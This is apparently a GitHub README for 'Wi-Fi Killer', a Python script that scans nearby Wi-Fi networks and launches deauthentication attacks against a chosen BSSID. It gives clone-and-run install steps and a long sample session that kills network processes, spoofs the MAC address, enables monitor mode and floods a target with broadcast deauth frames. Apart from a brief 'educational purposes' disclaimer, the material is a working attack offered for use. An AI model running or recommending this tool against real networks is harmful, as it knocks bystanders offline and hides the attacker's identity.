# 🚀 Wi-Fi Killer - Deauthentication Script

## ⚡ What is it?

Wi-Fi Killer is a simple tool that lets you perform a **deauthentication attack** on Wi-Fi networks. 🛠️ It sends packets to disconnect devices from a target network (BSSID). Only use it on networks you own or have explicit permission to attack! 🚨

💥 **Warning**: This script is for **educational purposes only**! Misusing it could get you in legal trouble. 🏴‍☠️

---

## 🛠️ Features

- 🏙️ **Scan networks** and see their details (SSID, BSSID, channel, etc.)
- 💣 **Deauth attack**: Disconnect devices from a selected Wi-Fi network
- 🕵️‍♂️ **Anonymize your MAC** address for privacy
- 🔄 **Change channels** to target specific networks more easily
- 🚫 **Stop NetworkManager** to prevent automatic mode-switching

---

## 🔥 Requirements

Before you can use this script, you'll need to install some tools:

- aircrack-ng 🔐
- macchanger 🛡️
- iw 📡
- libncurses5-dev 🎮
- libpcap-dev 🕹️
- Python 3 + pip 🐍

You'll also need to install the `tabulate` library:

```bash
pip3 install tabulate
```
Get it up and running in just a few steps! 🎉

Clone the repo:
```bash
git clone https://github.com/thisudo/wifi-Deauthentication-script
cd wifi-Deauthentication-script
sudo bash install.sh
```
This will set up all your dependencies:

🏃‍♂️ Usage
Run the script:
```bash
sudo python3 wifi_killer.py
```
Pick your interface (e.g., wlan0).

Scan networks and pick the BSSID of the target you want to attack. 💥

Confirm the channel and start the attack. 💣

Hit Ctrl+C to stop the attack and clean everything up. 🔚

## Exemple on ubuntu
```bash
██╗    ██╗██╗      ███████╗██╗    ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
██║    ██║██║      ██╔════╝██║    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
██║ █╗ ██║██║█████╗█████╗  ██║    █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
██║███╗██║██║╚════╝██╔══╝  ██║    ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
╚███╔███╔╝██║      ██║     ██║    ██║  ██╗██║███████╗███████╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝      ╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                                                       by: abdo3Dr 
[!] Wi-Fi Deauthentication Script [!]                
    For educational purposes only!
    Use at your own risk on your own network!
    I am not responsible for any misuse!

**************************************************
[INFO] Scan networks and launch deauth attack.
[WARNING] Only use this on networks you own!
**************************************************
lo        no wireless extensions.

eno1      no wireless extensions.

wlp2s0    IEEE 802.11  ESSID:"<HIDDEN_SSID>"  
          Mode:Managed  Frequency:2.412 GHz  Access Point: <HIDDEN_BSSID>   
          Bit Rate=58.5 Mb/s   Tx-Power=15 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
          Link Quality=46/70  Signal level=-64 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:97   Missed beacon:0

docker0   no wireless extensions.

[?] Enter your INTERFACE: wlp2s0
+-------------------+----------------------------+---------+-----------------------+------------+
|       BSSID       |            SSID            | Channel | Signal Strength (dBm) | Encryption |
+-------------------+----------------------------+---------+-----------------------+------------+
| <HIDDEN_BSSID>    |        <HIDDEN_SSID_1>      |   48    |          -77          |    Yes     |
| <HIDDEN_BSSID>    |      <HIDDEN_SSID_2>       |   11    |          -57          |    Yes     |
| <HIDDEN_BSSID>    |         <HIDDEN_SSID_3>    |    9    |          -73          |    Yes     |
| <HIDDEN_BSSID>    |    <HIDDEN_SSID_4>         |    3    |          -54          |    Yes     |
| <HIDDEN_BSSID>    |        <HIDDEN_SSID_5>     |    1    |          -65          |    Yes     |
| <HIDDEN_BSSID>    |     <HIDDEN_SSID_6>        |    2    |          -71          |    Yes     |
| <HIDDEN_BSSID>    |    <HIDDEN_SSID_7>         |    6    |          -79          |    Yes     |
| <HIDDEN_BSSID>    |           <HIDDEN_SSID_8>  |    6    |          -79          |    Yes     |
| <HIDDEN_BSSID>    |           <HIDDEN_SSID_9>  |    7    |          -81          |    Yes     |
| <HIDDEN_BSSID>    | <HIDDEN_SSID_10>           |    1    |          -87          |    Yes     |
| <HIDDEN_BSSID>    |           <HIDDEN_SSID_11> |   40    |          -86          |    Yes     |
+-------------------+----------------------------+---------+-----------------------+------------+

 [?] Enter the Wi-Fi BSSID to attack: <HIDDEN_BSSID>
Disconnecting from the AP...
[*] Killing interfering processes...

Killing these processes:

    PID Name
  30183 NetworkManager
  30193 wpa_supplicant
  30839 avahi-daemon
  30842 avahi-daemon

[*] Anonymizing MAC address...
Current MAC:   <HIDDEN_MAC> (unknown)
Permanent MAC: <HIDDEN_MAC> (Intel Corporate)
New MAC:       <HIDDEN_MAC> (unknown)
[+] MAC address anonymized.
[*] Enabling monitor mode on wlp2s0...

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
  30858 avahi-daemon
  30860 avahi-daemon

PHY	Interface	Driver		Chipset

phy0	wlp2s0		iwlwifi		Intel Corporation Centrino Advanced-N 6200 (rev 35)
		(monitor mode enabled)

[+] Monitor mode enabled on wlp2s0.
Changing channel to 11...
Sending deauthentication packets to BSSID: <HIDDEN_BSSID>
06:46:28  Waiting for beacon frame (BSSID: <HIDDEN_BSSID>) on channel 11
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
06:46:28  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:28  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:29  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:29  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:30  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:30  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:31  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:31  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:32  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:32  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:32  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:33  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:33  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:34  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:34  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
06:46:35  Sending DeAuth (code 7) to broadcast -- BSSID: [<HIDDEN_BSSID>]
```

🏃‍♂️ Usage
Once you’ve finished with the attack, you can return the Wi-Fi card to managed mode by running the following commands:

```bash
sudo airmon-ng stop <interface>
sudo systemctl restart NetworkManager
```
This will stop the monitor mode on your Wi-Fi interface and restart the NetworkManager service to get everything back to normal. 🔄


✍️ Author

thisudo
